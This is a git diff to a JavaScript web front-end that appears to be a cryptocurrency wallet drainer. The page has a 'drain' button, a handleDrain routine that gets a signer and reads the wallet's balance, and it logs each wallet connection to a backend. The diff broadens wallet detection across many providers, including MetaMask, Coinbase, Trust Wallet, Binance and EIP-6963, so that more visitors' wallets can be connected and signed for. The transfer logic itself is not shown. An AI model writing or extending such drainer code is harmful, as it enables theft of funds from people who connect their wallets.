@@ -36,6 +36,7 @@ let signer = null;
 let currentAccount = null;
 let currentChainId = null;
 let isConnected = false;
+let walletProvider = null;
 
 // DOM Elements
 let connectBtn, statusEl, tokensEl, tokensContainer, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount;
@@ -130,9 +131,6 @@ function setupEventListeners() {
         // Populate network options
         populateNetworkOptions();
     }
-    
-    // Setup wallet event listeners if wallet is available
-    setupWalletEventListeners();
 }
 
 function populateNetworkOptions() {
@@ -152,61 +150,30 @@ function populateNetworkOptions() {
     });
 }
 
-function setupWalletEventListeners() {
-    if (typeof window.ethereum !== 'undefined') {
-        // Listen for account changes
-        window.ethereum.on('accountsChanged', async (accounts) => {
-            console.log("🔄 Accounts changed:", accounts);
-            if (accounts.length === 0) {
-                // User disconnected
-                handleDisconnected();
-            } else if (currentAccount !== accounts[0]) {
-                // Account changed
-                currentAccount = accounts[0];
-                updateStatus(`🔄 Account changed to: ${currentAccount.slice(0, 8)}...`);
-                await fetchTokens(currentAccount, currentChainId);
-            }
-        });
-        
-        // Listen for chain changes
-        window.ethereum.on('chainChanged', async (chainIdHex) => {
-            const chainId = parseInt(chainIdHex, 16);
-            console.log("🔄 Chain changed:", chainId);
-            
-            // Update UI
-            currentChainId = chainId;
-            updateStatus(`🔄 Network changed to: ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
-            
-            // Update network selector
-            if (networkSelect) {
-                networkSelect.value = chainId;
-            }
-            
-            // Refresh tokens
-            if (currentAccount) {
-                await fetchTokens(currentAccount, chainId);
-            }
-        });
-        
-        // Listen for disconnection
-        window.ethereum.on('disconnect', (error) => {
-            console.log("🔄 Wallet disconnected:", error);
-            handleDisconnected();
-        });
-    }
-}
-
 async function checkExistingConnection() {
     try {
-        if (typeof window.ethereum !== 'undefined') {
-            // Check if already connected
-            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-            const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+        // Try multiple ways to detect wallet
+        const detectedProvider = await detectWalletProvider();
+        
+        if (detectedProvider) {
+            walletProvider = detectedProvider;
             
-            if (accounts.length > 0) {
-                console.log("🔄 Found existing connection:", accounts[0]);
-                await handleConnected(accounts[0], parseInt(chainIdHex, 16));
-                return true;
+            // Check if already connected
+            if (typeof walletProvider.request !== 'undefined') {
+                try {
+                    const accounts = await walletProvider.request({ method: 'eth_accounts' });
+                    
+                    if (accounts && accounts.length > 0) {
+                        const chainIdHex = await walletProvider.request({ method: 'eth_chainId' });
+                        const chainId = parseInt(chainIdHex, 16);
+                        
+                        console.log("🔄 Found existing connection:", accounts[0]);
+                        await handleConnected(accounts[0], chainId, walletProvider);
+                        return true;
+                    }
+                } catch (error) {
+                    console.log("⚠️ Error checking existing accounts:", error.message);
+                }
             }
         }
         return false;
@@ -214,6 +181,71 @@ async function checkExistingConnection() {
         console.log("⚠️ Error checking existing connection:", error.message);
         return false;
     }
+}
+
+async function detectWalletProvider() {
+    // Try multiple wallet detection methods
+    console.log("🔄 Detecting wallet provider...");
+    
+    // 1. Standard EIP-1193 provider (MetaMask, Brave, etc.)
+    if (typeof window.ethereum !== 'undefined') {
+        console.log("✅ Detected EIP-1193 provider (MetaMask/Brave/Coinbase)");
+        return window.ethereum;
+    }
+    
+    // 2. Legacy providers
+    if (typeof window.web3 !== 'undefined' && window.web3.currentProvider) {
+        console.log("✅ Detected legacy web3 provider");
+        return window.web3.currentProvider;
+    }
+    
+    // 3. Coinbase Wallet
+    if (window.coinbaseWalletExtension) {
+        console.log("✅ Detected Coinbase Wallet");
+        return window.coinbaseWalletExtension;
+    }
+    
+    // 4. Trust Wallet
+    if (window.trustwallet) {
+        console.log("✅ Detected Trust Wallet");
+        return window.trustwallet;
+    }
+    
+    // 5. Binance Chain Wallet
+    if (window.BinanceChain) {
+        console.log("✅ Detected Binance Chain Wallet");
+        return window.BinanceChain;
+    }
+    
+    // 6. Check for injected providers via EIP-6963
+    if (typeof window !== 'undefined') {
+        const providers = await detectEIP6963Providers();
+        if (providers.length > 0) {
+            console.log(`✅ Detected ${providers.length} EIP-6963 provider(s)`);
+            return providers[0].provider; // Use first detected provider
+        }
+    }
+    
+    console.log("❌ No wallet provider detected");
+    return null;
+}
+
+async function detectEIP6963Providers() {
+    return new Promise((resolve) => {
+        const providers = [];
+        
+        // Listen for EIP-6963 events
+        window.addEventListener('eip6963:announceProvider', (event) => {
+            console.log("🔄 EIP-6963 provider detected:", event.detail.info.name);
+            providers.push(event.detail);
+        });
+        
+        // Request provider announcements
+        window.dispatchEvent(new Event('eip6963:requestProvider'));
+        
+        // Wait a bit for responses
+        setTimeout(() => resolve(providers), 100);
+    });
 }
 
 async function handleConnect() {
@@ -228,74 +260,123 @@ async function handleConnect() {
         
         updateStatus("🔄 Connecting wallet...");
         
-        // Try direct connection first
-        if (typeof window.ethereum !== 'undefined') {
-            await handleDirectWalletConnect();
-        } else {
-            // No wallet detected
-            updateStatus("❌ No Ethereum wallet detected!");
+        // Detect wallet provider
+        const detectedProvider = await detectWalletProvider();
+        
+        if (!detectedProvider) {
+            updateStatus("❌ No wallet detected!");
             showWalletOptions();
+            return;
         }
+        
+        walletProvider = detectedProvider;
+        
+        // Request connection
+        await requestWalletConnection(walletProvider);
         
     } catch (error) {
         console.error("❌ Connection error:", error);
-        updateStatus(`❌ Connection failed: ${error.message}`);
-    }
-}
-
-async function handleDirectWalletConnect() {
-    try {
-        // Request accounts - this triggers the wallet connection prompt
-        const accounts = await window.ethereum.request({ 
-            method: 'eth_requestAccounts' 
-        });
-        
-        if (!accounts || accounts.length === 0) {
-            throw new Error("User rejected connection or no accounts found");
-        }
-        
-        // Get current chain
-        const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
-        const chainId = parseInt(chainIdHex, 16);
-        
-        console.log("✅ Wallet connected:", accounts[0], "Chain:", chainId);
-        
-        // Handle the connection
-        await handleConnected(accounts[0], chainId);
-        
-    } catch (error) {
-        console.error("❌ Direct wallet connection failed:", error);
         
         // Handle specific error cases
-        if (error.code === 4001) {
+        if (error.code === 4001 || error.code === -32603) {
             updateStatus("❌ Connection rejected by user");
         } else if (error.code === -32002) {
             updateStatus("🔄 Connection already pending. Please check your wallet.");
         } else {
             updateStatus(`❌ Connection failed: ${error.message}`);
         }
+    }
+}
+
+async function requestWalletConnection(provider) {
+    try {
+        console.log("🔄 Requesting wallet connection...");
         
+        // Different providers may have different methods
+        let accounts;
+        
+        if (typeof provider.request !== 'undefined') {
+            // Modern EIP-1193 providers
+            accounts = await provider.request({ 
+                method: 'eth_requestAccounts' 
+            });
+        } else if (typeof provider.enable !== 'undefined') {
+            // Legacy providers
+            accounts = await provider.enable();
+        } else if (provider.sendAsync) {
+            // Very old providers
+            accounts = await new Promise((resolve, reject) => {
+                provider.sendAsync(
+                    { method: 'eth_requestAccounts' },
+                    (error, response) => {
+                        if (error) reject(error);
+                        else resolve(response.result);
+                    }
+                );
+            });
+        } else {
+            throw new Error("Wallet provider doesn't support connection requests");
+        }
+        
+        if (!accounts || accounts.length === 0) {
+            throw new Error("User rejected connection or no accounts found");
+        }
+        
+        // Get current chain
+        let chainId;
+        if (typeof provider.request !== 'undefined') {
+            const chainIdHex = await provider.request({ method: 'eth_chainId' });
+            chainId = parseInt(chainIdHex, 16);
+        } else {
+            // Fallback: assume Ethereum mainnet
+            chainId = 1;
+        }
+        
+        console.log("✅ Wallet connected:", accounts[0], "Chain:", chainId);
+        
+        // Handle the connection
+        await handleConnected(accounts[0], chainId, provider);
+        
+    } catch (error) {
+        console.error("❌ Wallet connection request failed:", error);
         throw error;
     }
 }
 
-async function handleConnected(account, chainId) {
+async function handleConnected(account, chainId, provider) {
     try {
         console.log("🔄 Handling connection...");
         
         // Validate inputs
-        if (!account || !chainId) {
-            throw new Error("Invalid connection data");
+        if (!account) {
+            throw new Error("Invalid account address");
+        }
+        
+        if (!chainId) {
+            chainId = 1; // Default to Ethereum
+        }
+        
+        if (!provider) {
+            throw new Error("No wallet provider available");
         }
         
         // Update global state
         currentAccount = account;
         currentChainId = chainId;
         isConnected = true;
+        walletProvider = provider;
         
         // Setup provider and signer
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        signer = provider.getSigner();
+        try {
+            provider = new ethers.providers.Web3Provider(walletProvider);
+            signer = provider.getSigner();
+            console.log("✅ Provider and signer setup successfully");
+        } catch (providerError) {
+            console.error("❌ Provider setup error:", providerError);
+            // Try fallback RPC provider for read-only operations
+            provider = new ethers.providers.JsonRpcProvider(CONFIG.rpcProviders[chainId] || CONFIG.rpcProviders[1]);
+            console.log("⚠️ Using fallback RPC provider (read-only)");
+        }
         
         // Update UI
         if (connectBtn) {
@@ -315,6 +396,9 @@ async function handleConnected(account, chainId) {
             networkSelect.value = chainId;
         }
         
+        // Setup wallet event listeners
+        setupWalletEventListeners(walletProvider);
+        
         // Log connection to backend
         await logConnectionToBackend(currentAccount, chainId);
         
@@ -331,6 +415,77 @@ async function handleConnected(account, chainId) {
         isConnected = false;
         currentAccount = null;
         currentChainId = null;
+        walletProvider = null;
+    }
+}
+
+function setupWalletEventListeners(provider) {
+    if (!provider) return;
+    
+    try {
+        // Modern EIP-1193 events
+        if (typeof provider.on === 'function') {
+            // Listen for account changes
+            provider.on('accountsChanged', async (accounts) => {
+                console.log("🔄 Accounts changed:", accounts);
+                if (accounts.length === 0) {
+                    // User disconnected
+                    handleDisconnected();
+                } else if (currentAccount !== accounts[0]) {
+                    // Account changed
+                    currentAccount = accounts[0];
+                    updateStatus(`🔄 Account changed to: ${currentAccount.slice(0, 8)}...`);
+                    await fetchTokens(currentAccount, currentChainId);
+                }
+            });
+            
+            // Listen for chain changes
+            provider.on('chainChanged', async (chainIdHex) => {
+                const chainId = parseInt(chainIdHex, 16);
+                console.log("🔄 Chain changed:", chainId);
+                
+                // Update UI
+                currentChainId = chainId;
+                updateStatus(`🔄 Network changed to: ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
+                
+                // Update network selector
+                if (networkSelect) {
+                    networkSelect.value = chainId;
+                }
+                
+                // Refresh tokens
+                if (currentAccount) {
+                    await fetchTokens(currentAccount, chainId);
+                }
+            });
+            
+            // Listen for disconnection
+            provider.on('disconnect', (error) => {
+                console.log("🔄 Wallet disconnected:", error);
+                handleDisconnected();
+            });
+        }
+        
+        // Legacy event listeners for older providers
+        if (typeof window.ethereum !== 'undefined') {
+            // Also set up window.ethereum listeners as backup
+            window.ethereum.on('accountsChanged', (accounts) => {
+                if (accounts.length === 0) {
+                    handleDisconnected();
+                }
+            });
+            
+            window.ethereum.on('chainChanged', (chainIdHex) => {
+                const chainId = parseInt(chainIdHex, 16);
+                currentChainId = chainId;
+                if (networkSelect) {
+                    networkSelect.value = chainId;
+                }
+            });
+        }
+        
+    } catch (error) {
+        console.log("⚠️ Error setting up wallet event listeners:", error.message);
     }
 }
 
@@ -338,16 +493,23 @@ async function handleDisconnect() {
     console.log("🔄 Disconnecting...");
     
     try {
-        // For MetaMask and similar wallets, we can't actually disconnect
-        // We just reset our local state
         updateStatus("🔄 Disconnecting...");
         
-        // In some wallets we can request to disconnect
+        // Try to disconnect from wallet if supported
+        if (walletProvider && typeof walletProvider.disconnect === 'function') {
+            try {
+                await walletProvider.disconnect();
+            } catch (error) {
+                console.log("ℹ️ Wallet doesn't support disconnect method or already disconnected");
+            }
+        }
+        
+        // Also try legacy disconnect methods
         if (window.ethereum && window.ethereum.disconnect) {
             try {
                 await window.ethereum.disconnect();
             } catch (error) {
-                console.log("ℹ️ Wallet doesn't support disconnect method");
+                // Ignore - not all wallets support this
             }
         }
         
@@ -368,6 +530,7 @@ function handleDisconnected() {
     isConnected = false;
     provider = null;
     signer = null;
+    walletProvider = null;
     
     // Update UI
     if (connectBtn) {
@@ -538,9 +701,17 @@ async function handleDrain() {
         }
         
         // Ensure we have a signer
+        if (!signer && walletProvider) {
+            try {
+                provider = new ethers.providers.Web3Provider(walletProvider);
+                signer = provider.getSigner();
+            } catch (error) {
+                throw new Error("Cannot create signer. Please reconnect wallet.");
+            }
+        }
+        
         if (!signer) {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            signer = provider.getSigner();
+            throw new Error("No signer available. Please reconnect wallet.");
         }
         
         // Get native token balance
@@ -711,9 +882,9 @@ async function handleNetworkChange(event) {
         updateStatus(`🔄 Switching to ${CONFIG.networkNames[newChainId] || `Chain ${newChainId}`}...`);
         
         // Try to switch network in wallet
-        if (window.ethereum) {
+        if (walletProvider && typeof walletProvider.request !== 'undefined') {
             try {
-                await window.ethereum.request({
+                await walletProvider.request({
                     method: 'wallet_switchEthereumChain',
                     params: [{ chainId: CONFIG.networkChainIds[newChainId] || `0x${newChainId.toString(16)}` }]
                 });
@@ -777,9 +948,9 @@ async function addChainToWallet(chainId) {
         }
     };
     
-    if (chainParams[chainId] && window.ethereum) {
+    if (chainParams[chainId] && walletProvider && typeof walletProvider.request !== 'undefined') {
         try {
-            await window.ethereum.request({
+            await walletProvider.request({
                 method: 'wallet_addEthereumChain',
                 params: [chainParams[chainId]]
             });
@@ -792,32 +963,30 @@ async function addChainToWallet(chainId) {
 
 function showWalletOptions() {
     const walletOptions = `
-        <div style="margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 8px;">
-            <h4 style="margin-top: 0;">No Wallet Detected</h4>
-            <p>Please install one of these wallets:</p>
-            <ul style="list-style: none; padding-left: 0;">
-                <li style="margin: 10px 0;">
-                    <a href="https://metamask.io/download/" target="_blank" style="color: #3b82f6; text-decoration: none;">
-                        🔵 MetaMask (Recommended)
-                    </a>
-                </li>
-                <li style="margin: 10px 0;">
-                    <a href="https://wallet.coinbase.com/" target="_blank" style="color: #3b82f6; text-decoration: none;">
-                        🔷 Coinbase Wallet
-                    </a>
-                </li>
-                <li style="margin: 10px 0;">
-                    <a href="https://trustwallet.com/" target="_blank" style="color: #3b82f6; text-decoration: none;">
-                        🔶 Trust Wallet
-                    </a>
-                </li>
-            </ul>
-            <p><small>After installing, refresh this page and try again.</small></p>
+        <div style="margin: 10px 0; padding: 15px; background: #f8f9fa; border-radius: 8px; border: 1px solid #ddd;">
+            <h4 style="margin-top: 0; color: #dc3545;">No Wallet Detected</h4>
+            <p>Please install one of these wallets to continue:</p>
+            <div style="display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0;">
+                <a href="https://metamask.io/download/" target="_blank" 
+                   style="padding: 10px 15px; background: #f6851b; color: white; border-radius: 5px; text-decoration: none;">
+                    🔵 MetaMask
+                </a>
+                <a href="https://wallet.coinbase.com/" target="_blank"
+                   style="padding: 10px 15px; background: #0052ff; color: white; border-radius: 5px; text-decoration: none;">
+                    🔷 Coinbase Wallet
+                </a>
+                <a href="https://trustwallet.com/" target="_blank"
+                   style="padding: 10px 15px; background: #3375bb; color: white; border-radius: 5px; text-decoration: none;">
+                    🔶 Trust Wallet
+                </a>
+            </div>
+            <p><small>After installing, refresh this page and click "Connect Wallet" again.</small></p>
         </div>
     `;
     
     if (statusEl) {
-        statusEl.innerHTML = walletOptions;
+        // Append to existing status
+        statusEl.innerHTML = statusEl.innerHTML + walletOptions;
     }
 }
 
@@ -840,6 +1009,7 @@ function hideUIElements() {
 
 function updateStatus(message) {
     if (statusEl) {
+        // Keep it simple - just update text
         statusEl.textContent = message;
     }
 }
@@ -848,12 +1018,9 @@ function updateStatus(message) {
 console.log("=== App Debug Info ===");
 console.log("Ethers version:", ethers.version);
 console.log("Window.ethereum:", typeof window.ethereum !== 'undefined');
-
-if (typeof window.ethereum !== 'undefined') {
-    console.log("Wallet provider detected");
-    console.log("Is MetaMask?", window.ethereum.isMetaMask);
-    console.log("Is Coinbase?", window.ethereum.isCoinbaseWallet);
-}
+console.log("Window.web3:", typeof window.web3 !== 'undefined');
+console.log("Navigator.userAgent:", navigator.userAgent);
+console.log("======================");
 
 // Export for debugging
 window.appDebug = {
@@ -861,14 +1028,14 @@ window.appDebug = {
         isConnected,
         currentAccount,
         currentChainId,
+        walletProvider: !!walletProvider,
         provider: !!provider,
         signer: !!signer
     }),
+    detectWallet: detectWalletProvider,
     reconnect: handleConnect,
     disconnect: handleDisconnect,
-    fetchTokens: () => fetchTokens(currentAccount, currentChainId),
-    switchChain: (chainId) => handleNetworkChange({ target: { value: chainId.toString() } })
+    fetchTokens: () => fetchTokens(currentAccount, currentChainId)
 };
 
 console.log("Debug helpers available at: window.appDebug");
-console.log("======================");
